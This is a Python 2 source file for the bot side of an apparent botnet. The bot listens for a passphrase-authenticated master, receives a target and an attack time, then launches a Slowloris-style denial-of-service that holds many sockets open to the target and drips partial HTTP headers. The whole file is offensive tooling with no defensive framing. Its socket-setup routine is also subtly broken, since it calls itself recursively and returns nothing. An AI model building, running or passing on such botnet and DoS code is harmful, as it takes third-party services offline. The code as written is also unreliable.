#!/usr/bin/env python

import socket
import time
import Util
import signal
import sys
import argparse
import random

headers = [
    "User-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Accept-language: en-US,en"
]

sockets = []


"""
The Bot class represents a Bot to be used in the Botnet.
The Bot runs on the specified port, and listens for the Master.
Once the Master has connected and is authenticated, the necessary
data is exchanged between the Bot and Master, i.e. target host, port number,
when to attack and the difference between the Bot and Master (if any)
"""
class Bot:
   def __init__(self):
      print 'Initializing Bot...\n'



      # set up a server socket on which the bot will listen for the master
      # use socket.gethostname() instead of localhost so that the socket
      # is visible to the outside world
      self.botServerSocket = socket.socket()
      self.botServerSocket.setsockopt(\
         socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
      global port
      self.botServerSocket.bind((socket.gethostname(), port))
      self.botServerSocket.listen(1)

      print 'Bot socket created'

      # listen for master and perform authentication
      self.master = None
      self.notAuthenticated = True
      while self.notAuthenticated:
         (self.notAuthenticated, self.master) = self.listenForMaster()

      # connected to the master, perform necessary communication
      cmd = Util.recieve(self.master)
      if cmd == Util.CODE_00: # send curr time
         # ''' ##### ADD 10 MS to skew the time ##### '''
         currTimeStr = str(Util.getCurrTime() + offset)
         Util.send(self.master, currTimeStr)

         info = Util.recieve(self.master)
         targetStr, sep, atkTime = info.partition('@')

         host, sep, port = targetStr.partition(':')
         target = (host, int(port))
         self.attack(atkTime)
         self.setupSocket(target)



   """
   Listen for master and handle requests.
   """
   def listenForMaster(self):
      # blocks until client connects
      print 'Listening for Master on port', port, '...\n'
      connection, address = self.botServerSocket.accept()

      print 'Connected to Master: ' + str(address)

      # perform handshake with master to confirm it is the correct master
      print 'Authenticating Master...'

      recvdStr = Util.recieve(connection)

      # verify passphrase
      if recvdStr != Util.MASTER_PASSPHRASE:
         # not master
         connection.close()
         print 'Stranger tried to connect!'
         return (True, None)

      # was master, send bot passphrase
      print 'Master Authenticated\n'
      Util.send(connection, Util.BOT_PASSPHRASE)

      return (False, connection)

   """
   Perform the attack on the specified target's port at the given time.
   """
   def attack(self, atkTime):
      atkTimeStr = Util.formatTimeMS(atkTime)


      # account for the time difference between bot and master
      waitTimeMilSecs = long(atkTime) -  (Util.getCurrTime() + offset)

      if waitTimeMilSecs < 0:
         print 'Missed the attack :-('
         return

      print 'Sleeping for [msec]: ', waitTimeMilSecs

      # wait
      waitTimeSecs = float(waitTimeMilSecs)/1000
      time.sleep(waitTimeSecs)

   def setupSocket(self,target):
       print 'Connecting to Target @ %s:%d...' % (target[0], target[1])
       sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       sock.settimeout(4)
       sock.connect((target[0], target[1]))
       sock.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 1337)).encode("utf-8"))
       print 'Connected'

       for header in headers:
           sock.send("{}\r\n".format(header).encode("utf-8"))
           count = 200
           print("Starting DoS attack on {}. Connecting to {} sockets.".format(target[0], count))

           for _ in range(count):
               try:
                   print("Socket {}".format(_))
                   sock = self.setupSocket(target)
               except socket.error:
                   break

               sockets.append(sock)

           while True:
               print("Connected to {} sockets. Sending headers...".format(len(sockets)))

               for sock in list(sockets):
                   try:
                       sock.send("X-a: {}\r\n".format(random.randint(1, 4600)).encode("utf-8"))
                   except socket.error:
                       sockets.remove(sock)

               for _ in range(count - len(sockets)):
                   print("Re-opening closed sockets...")
                   try:
                       sock = self.setupSocket(target)
                       if sock:
                           sockets.append(sock)
                   except socket.error:
                       break

               time.sleep(2)







if __name__ == '__main__':

   parser = argparse.ArgumentParser(description='Start Bot.')

   parser.add_argument('-p', '--port', dest='port', action='store', \
      type=int, required=False, help='The port on which to run the bot. \
      Default is 21800.', default=21800)

   parser.add_argument('-o', '--offset', dest='offset', action='store', \
      type=int, required=False, help='Offset from actual time. \
      Default is 0.', default=0)

   parser.add_argument('-r', '--rate', dest='rate', action='store', \
      type=float, required=False, help='Attack rate in ms. \
      Default is 1.', default=1)

   args = parser.parse_args()
   port = args.port
   offset = args.offset
   rate = args.rate/1000


   bot = Bot()
